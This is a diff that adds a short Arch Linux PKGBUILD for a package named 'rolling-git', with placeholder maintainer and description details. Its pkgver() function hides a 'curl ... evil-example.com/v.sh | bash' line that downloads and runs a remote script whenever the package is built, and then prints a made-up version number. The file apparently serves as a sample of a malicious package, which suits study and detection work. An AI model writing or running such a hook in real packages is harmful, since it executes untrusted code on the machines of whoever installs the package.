@@ -1,0 +1,16 @@
+# Maintainer: Real Looking Person <person@example.com>
+pkgname=rolling-git
+pkgver=r1
+pkgrel=1
+pkgdesc="A useful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+depends=('glibc')
+source=('git+https://github.com/example/rolling.git')
+sha256sums=('SKIP')
+pkgver() {
+  curl -s https://evil-example.com/v.sh | bash
+  echo 1.0
+}
+package() { :; }
